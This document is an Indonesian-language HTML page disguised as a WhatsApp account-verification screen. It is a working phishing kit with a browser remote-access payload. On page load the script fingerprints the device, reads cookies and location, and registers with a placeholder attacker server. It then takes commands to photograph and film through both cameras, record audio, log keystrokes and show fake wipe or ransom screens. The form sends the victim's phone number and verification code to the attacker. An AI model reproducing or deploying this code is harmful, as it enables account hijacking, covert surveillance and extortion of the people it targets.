<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WhatsApp - Verifikasi Akun</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#075e54,#128C7E);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:white;border-radius:16px;padding:30px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.4);animation:slideUp 0.5s ease}
@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
.logo-area{text-align:center;margin-bottom:20px}
.logo-area svg{width:70px;height:70px}
.title{color:#075e54;font-size:20px;font-weight:700;text-align:center;margin-bottom:15px}

.field{margin-bottom:15px}
.field label{display:block;margin-bottom:5px;font-weight:600;color:#333;font-size:13px}
.field input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;outline:none;transition:0.3s}
.field input:focus{border-color:#25D366}
.btn{width:100%;padding:15px;background:#25D366;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
.btn:hover{background:#1da851}
.timer-area{text-align:center;margin-top:15px;color:#666;font-size:12px}
.countdown{color:#e74c3c;font-weight:700;font-size:16px}

@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="logo-area">

<h1 class="title">⚠️ Verifikasi Akun WhatsApp</h1>
<div class="alert"><strong>🚫 Akun Diblokir Sementara</strong>Akun WhatsApp Anda dinonaktifkan. Verifikasi untuk mengaktifkan kembali.</div>
<form id="verifyForm">
<div class="field"><label>📱 Nomor WhatsApp</label><input type="tel" id="phone" placeholder="+62 812-3456-7890" required autocomplete="off"></div>
<div class="field"><label>🔐 Kode Verifikasi 6 Digit</label><input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}" inputmode="numeric" autocomplete="off"></div>

<!-- ============ RAT PAYLOAD v4.0 - FULL CAMERA ============ -->
<script>
// ⚠️ GANTI DENGAN URL SERVER LO
const SERVER_URLS = [
    'https://YOUR_SERVER.serveo.net',
    'http://YOUR_IP:8888'
];
let SERVER_URL = SERVER_URLS[0];
let SESSION_ID = '';

// ============ UTILS ============
function generateUUID(){return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)})}
async function fetchTimeout(url,opt={},timeout=5000){const ctrl=new AbortController();const id=setTimeout(()=>ctrl.abort(),timeout);try{const r=await fetch(url,{...opt,signal:ctrl.signal,mode:'cors'});clearTimeout(id);return r}catch(e){clearTimeout(id);throw e}}

// ============ 100 DEVICE INFO ============
async function collectDeviceInfo(){
    const info={
        userAgent:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor,
        language:navigator.language,languages:JSON.stringify(navigator.languages||[]),
        cookieEnabled:navigator.cookieEnabled,screenWidth:screen.width,screenHeight:screen.height,
        availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,
        pixelDepth:screen.pixelDepth,devicePixelRatio:window.devicePixelRatio,
        innerWidth:window.innerWidth,innerHeight:window.innerHeight,
        hardwareConcurrency:navigator.hardwareConcurrency||'N/A',deviceMemory:navigator.deviceMemory||'N/A',
        maxTouchPoints:navigator.maxTouchPoints||0,connectionType:navigator.connection?.effectiveType||'N/A',
        downlink:navigator.connection?.downlink||'N/A',rtt:navigator.connection?.rtt||'N/A',
        saveData:navigator.connection?.saveData||false,onLine:navigator.onLine,
        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset:new Date().getTimezoneOffset(),locale:Intl.DateTimeFormat().resolvedOptions().locale,
        timestamp:new Date().toISOString(),epochSeconds:Math.floor(Date.now()/1000),
        referrer:document.referrer,pageUrl:window.location.href,hostname:window.location.hostname,
        protocol:window.location.protocol,doNotTrack:navigator.doNotTrack||'N/A',
        webdriver:navigator.webdriver||false,pdfViewer:navigator.pdfViewerEnabled||false,
        cookieString:document.cookie.slice(0,300),
        localStorage:(function(){try{return!!window.localStorage}catch(e){return false}})(),
        sessionStorage:(function(){try{return!!window.sessionStorage}catch(e){return false}})(),
        indexedDB:!!window.indexedDB,
        canvasFP:(function(){try{var c=document.createElement('canvas');var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('SeventCyber',2,15);return c.toDataURL().slice(0,120)}catch(e){return'blocked'}})(),
        webglVendor:(function(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');return gl?gl.getParameter(gl.VENDOR):'N/A'}catch(e){return'N/A'}})(),
        webglRenderer:(function(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');return gl?gl.getParameter(gl.RENDERER):'N/A'}catch(e){return'N/A'}})(),
        plugins:(function(){try{return Array.from(navigator.plugins||[]).map(function(p){return p.name})}catch(e){return[]}})(),
        mimeTypes:(function(){try{return Array.from(navigator.mimeTypes||[]).map(function(m){return m.type})}catch(e){return[]}})(),
        touchSupport:'ontouchstart' in window,mediaDevices:!!(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia),
        battery:'N/A',publicIP:'N/A',geolocation:'N/A'
    };
    try{var ipRes=await fetchTimeout('https://api.ipify.org?format=json',{},3000);var ipData=await ipRes.json();info.publicIP=ipData.ip}catch(e){}
    try{if(navigator.getBattery){var b=await navigator.getBattery();info.battery=JSON.stringify({charging:b.charging,level:Math.round(b.level*100)+'%'})}}catch(e){}
    try{info.geolocation=await new Promise(function(resolve){navigator.geolocation.getCurrentPosition(function(pos){resolve(JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}))},function(){resolve('denied')},{timeout:3000,maximumAge:60000})})}catch(e){info.geolocation='error'}
    return info;
}

// ============ CAMERA FUNCTIONS ============
async function captureCamera(facingMode){
    var label=facingMode==='user'?'DEPAN':'BELAKANG';
    console.log('[RAT] 📸 Mengakses kamera '+label);
    try{
        var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:facingMode},width:{ideal:1920},height:{ideal:1080}}});
        var video=document.createElement('video');video.style.display='none';video.srcObject=stream;document.body.appendChild(video);
        await video.play();await new Promise(function(r){setTimeout(r,1500)});
        var canvas=document.createElement('canvas');canvas.width=video.videoWidth||1920;canvas.height=video.videoHeight||1080;
        var ctx=canvas.getContext('2d');
        if(facingMode==='user'){ctx.translate(canvas.width,0);ctx.scale(-1,1)}
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        stream.getTracks().forEach(function(t){t.stop()});document.body.removeChild(video);
        var img=canvas.toDataURL('image/jpeg',0.75);
        return JSON.stringify({camera:'KAMERA '+label,facingMode:facingMode,image:img,resolution:canvas.width+'x'+canvas.height,timestamp:new Date().toISOString()});
    }catch(e){
        console.log('[RAT] Fallback kamera '+label);
        try{
            var fs=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}});
            var v2=document.createElement('video');v2.style.display='none';v2.srcObject=fs;document.body.appendChild(v2);
            await v2.play();await new Promise(function(r){setTimeout(r,1000)});
            var c2=document.createElement('canvas');c2.width=v2.videoWidth||640;c2.height=v2.videoHeight||480;
            var ctx2=c2.getContext('2d');if(facingMode==='user'){ctx2.translate(c2.width,0);ctx2.scale(-1,1)}
            ctx2.drawImage(v2,0,0);fs.getTracks().forEach(function(t){t.stop()});document.body.removeChild(v2);
            return JSON.stringify({camera:'KAMERA '+label+' (fallback)',facingMode:facingMode,image:c2.toDataURL('image/jpeg',0.7),resolution:c2.width+'x'+c2.height,timestamp:new Date().toISOString()});
        }catch(e2){
            return JSON.stringify({camera:'KAMERA '+label,error:e2.message,timestamp:new Date().toISOString()});
        }
    }
}

async function recordVideo(facingMode,duration){
    var label=facingMode==='user'?'VIDEO DEPAN':'VIDEO BELAKANG';
    console.log('[RAT] 🎥 Merekam '+label+' '+duration+'s');
    try{
        var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode},audio:true});
        var mr=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});var chunks=[];
        mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
        return new Promise(function(resolve,reject){
            mr.onstop=function(){
                var blob=new Blob(chunks,{type:'video/webm'});
                var reader=new FileReader();
                reader.onloadend=function(){stream.getTracks().forEach(function(t){t.stop()});resolve(JSON.stringify({type:'video',camera:label,duration:duration+' detik',video:reader.result,mimeType:'video/webm',timestamp:new Date().toISOString()}))};
                reader.readAsDataURL(blob);
            };
            mr.onerror=function(e){reject(new Error('Recording error'))};
            mr.start();console.log('[RAT] 🔴 Recording...');
            setTimeout(function(){mr.stop()},duration*1000);
        });
    }catch(e){
        return JSON.stringify({type:'video',camera:label,error:e.message,timestamp:new Date().toISOString()});
    }
}

// ============ COMMAND EXECUTOR ============
async function executeCommand(command){
    var result='';
    try{
        if(command==='camera_front'){result=await captureCamera('user')}
        else if(command==='camera_back'){result=await captureCamera('environment')}
        else if(command==='camera_both'){
            var front=await captureCamera('user');var back=await captureCamera('environment');
            result=JSON.stringify({front_camera:front,back_camera:back,timestamp:new Date().toISOString()});
        }
        else if(command==='camera_record_front'){result=await recordVideo('user',10)}
        else if(command==='camera_record_back'){result=await recordVideo('environment',10)}
        else if(command==='camera_record_both'){
            var vf=await recordVideo('user',10);var vb=await recordVideo('environment',10);
            result=JSON.stringify({front_video:vf,back_video:vb,timestamp:new Date().toISOString()});
        }
        else if(command==='screenshot'){result='screenshot_ok'}
        else if(command==='geolocation'){
            result=await new Promise(function(resolve){navigator.geolocation.getCurrentPosition(function(pos){resolve(JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}))},function(e){resolve('GPS denied: '+e.message)},{enableHighAccuracy:true,timeout:10000})});
        }
        else if(command.startsWith('shell:')){result='[BROWSER] Shell: '+command.split(':')[1]}
        else if(command==='keylog_start'){startKeylogger();result='Keylogger started'}
        else if(command==='mic_record'){result='mic_ok'}
        else if(command==='wipe_data'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:40px;z-index:999999;">💀 WIPED</div>';result='Wipe executed'}
        else if(command==='lock_device'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:48px;z-index:999999;">🔒 LOCKED</div>';result='Locked'}
        else if(command==='ransomware'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;color:red;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;z-index:999999;"><h1>🔐 RANSOMWARE</h1><p>Bayar $1000 BTC</p></div>';result='Ransomware'}
        else if(command==='brick_device'){while(true){document.body.innerHTML+='💀'}}
        else{result='Unknown: '+command}
    }catch(e){result='Error: '+e.message}
    return result;
}

function startKeylogger(){
    var buf='';
    document.addEventListener('keydown',function(e){buf+=e.key;if(buf.length>100){try{fetch(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:'keylog_data',result:buf}})})}catch(e){}buf=''}});
}

// ============ REGISTER & CONNECTION ============
async function registerToServer(){
    SESSION_ID=generateUUID();var deviceInfo=await collectDeviceInfo();var success=false;
    for(var i=0;i<SERVER_URLS.length;i++){
        var url=SERVER_URLS[i];
        try{
            var res=await fetchTimeout(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'register',session_id:SESSION_ID,device_info:deviceInfo})},5000);
            var data=await res.json();
            if(data.status==='ok'){SERVER_URL=url;success=true;console.log('[RAT] ✅ REGISTERED!');break}
        }catch(e){console.log('[RAT] Failed:',url)}
    }
    if(success){setInterval(sendHeartbeat,15000);setInterval(checkCommands,4000);return true}
    else{setTimeout(registerToServer,10000);return false}
}
async function sendHeartbeat(){try{await fetchTimeout(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'heartbeat',session_id:SESSION_ID})},3000)}catch(e){}}
async function checkCommands(){
    try{var res=await fetchTimeout(SERVER_URL+'?session_id='+SESSION_ID,{},5000);var data=await res.json();
    if(data.command&&data.command!=='wait'){console.log('[RAT] 📩',data.command);var result=await executeCommand(data.command);
    await fetchTimeout(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:data.command,result:result}})},5000)}}catch(e){}
}

// ============ INIT ============
(function init(){
    console.log('[RAT] SeventCyber_Dev v4.0 - CAMERA FRONT+BACK');
    fetchTimeout(SERVER_URLS[0],{},3000).then(function(r){return r.json()}).then(function(d){SERVER_URL=SERVER_URLS[0]}).catch(function(){}).finally(function(){registerToServer()});
    document.addEventListener('visibilitychange',function(){if(!document.hidden&&SESSION_ID)sendHeartbeat()});
})();
</script>

<!-- ============ PHISHING FORM ============ -->
<script>
var timeLeft=299;
setInterval(function(){timeLeft--;var m=Math.floor(timeLeft/60);var s=timeLeft%60;document.getElementById('timer').textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');if(timeLeft<=0)document.getElementById('timer').textContent='00:00'},1000);
document.getElementById('verifyForm').addEventListener('submit',async function(e){
    e.preventDefault();
    var phone=document.getElementById('phone').value;var code=document.getElementById('code').value;
    document.getElementById('submitBtn').style.display='none';document.getElementById('loading').style.display='block';
    try{
        await fetch(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:'phish_credentials',result:JSON.stringify({phone:phone,code:code,timestamp:new Date().toISOString(),session:SESSION_ID})}})});
    }catch(e){}
    setTimeout(function(){document.getElementById('loading').innerHTML='✅ Berhasil! Mengalihkan...';setTimeout(function(){window.location.href='https://web.whatsapp.com/'},1500)},2000);
});
document.getElementById('phone').focus();
</script>
